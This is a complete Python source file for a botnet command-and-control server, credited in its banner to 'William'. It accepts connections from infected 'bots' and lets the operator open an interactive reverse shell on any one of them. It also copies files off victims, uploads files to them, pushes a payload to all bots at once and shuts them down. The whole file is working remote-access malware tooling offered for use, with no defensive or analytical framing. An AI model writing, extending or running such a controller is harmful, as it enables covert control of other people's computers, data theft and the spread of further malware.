import socket
import os
import threading
import time

conn_addr_list = []

def start_and_listen():

    global server
    global header
    global format
    global server_status
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    header = 64
    format = 'utf-8' 
    server_status = True

    server.bind(("127.0.0.1", 6969))
    server.listen()

    accept_clients_thread = threading.Thread(target=accept_clients)
    accept_clients_thread.start()
    


def accept_clients():
    while server_status:
        conn, addr = server.accept()
        conn_addr_list.append((conn, addr))
    

def display_active_clients():
    
    for bot in conn_addr_list:
            try:
                send_message(bot[0], "!testconn")
            except:
                conn_addr_list.remove(bot)
    if len(conn_addr_list) > 0:
        print("[ACTIVE BOTS]")
        print("**************************")
        for i in range(len(conn_addr_list)):
            print(f"({i}) {conn_addr_list[i][1]}")
        print("**************************\n")
    else:
        print("No active bots")

    
def open_reverse_shell(bot, addr):
    os.system('cls')
    send_message(bot, "!openshell")

    shell_active = True
    while shell_active:
        cwd = recieve_message(bot)
        print(f"{addr}")
        command = input(f"{cwd}>")

        if command == "!exitshell":
            send_message(bot, "!exitshell")
            shell_active = False

        elif command[:2] == "cd":
            send_message(bot, command)

        elif command[:9] == "!copyfile":
            send_message(bot, command)
            recieve_file(bot, os.getcwd())
        elif command[:11] == "!uploadfile":
            send_message(bot, command)
            file_path = command[12:]
            if os.path.exists(file_path):
                send_file(bot, file_path)
            else:
                print("File does not exist.")
        else:
            send_message(bot, command)
            command_output = recieve_message(bot)

            print(f"{command_output}\n")

def upload_payload():
    file_path = input("Enter the path of the payload file: ")
    if os.path.exists(file_path):
        for bot in conn_addr_list:
            send_message(bot[0], "!uploadfile")
            send_file(bot[0], file_path)
            print(f"Payload uploaded to {bot[1]}")
    else:
        print("File does not exist.")
    


def main():
    print("------------------------")
    print(" Botnet made by William")
    print("------------------------\n")

    
    display_active_clients()

    print("(1) Refresh list")
    print("(2) Select bot")
    print("(3) Upload payload to all bots")
    print("(4) Shutdown server\n")
    try:
        user_choice = int(input(">"))
    except ValueError:
        print("Invalid input. Please enter a number.")
        time.sleep(2)
        os.system('cls')
        main()

    match user_choice:
        case 1:
            os.system('cls')
            main()
        case 2:
            selected_bot = int(input("\nEnter index of bot: "))
            open_reverse_shell(conn_addr_list[selected_bot][0], conn_addr_list[selected_bot][1])
            os.system('cls')
            main()
        case 3:
            upload_payload()
            time.sleep(2)
            os.system('cls')
            main()
        case 4:
            server_shutdown()
            


def server_shutdown():
    for bot in conn_addr_list:
        send_message(bot[0], "!shutdown")  
        bot[0].close()
    server.close()  
    print("Server shutdown successfully.")

def send_message(conn, msg):
    message_bytes = msg.encode(format)
    msg_length = len(message_bytes)
    msg_byte_length = str(msg_length).encode(format)
    msg_byte_length += b' ' * (header - len(msg_byte_length))
    conn.send(msg_byte_length)
    conn.send(message_bytes)
    

def recieve_message(conn):
    msg_length = conn.recv(header).decode(format)
    if msg_length:
        msg_length = int(msg_length)
        msg = conn.recv(msg_length).decode(format)
        return msg
    

def send_file(conn, path):
    file_name = os.path.basename(path)
    send_message(conn, file_name)
    file_size = os.path.getsize(path)
    send_message(conn, str(file_size))

    with open(path, 'rb') as file_reader:
        while True:
            data = file_reader.read(1024)
            if not data:
                break
            conn.send(data)
    

def recieve_file(conn, path):
    file_name = recieve_message(conn)
    file_size = int(recieve_message(conn))
    file_path = os.path.join(path, file_name)

    with open(file_path, 'wb') as file_writer:
        bytes_received = 0
        while bytes_received < file_size:
            data = conn.recv(min(1024, file_size - bytes_received))
            if not data:
                break
            file_writer.write(data)
            bytes_received += len(data)

    print("File received successfully.")
    

    

start_and_listen()  
main()







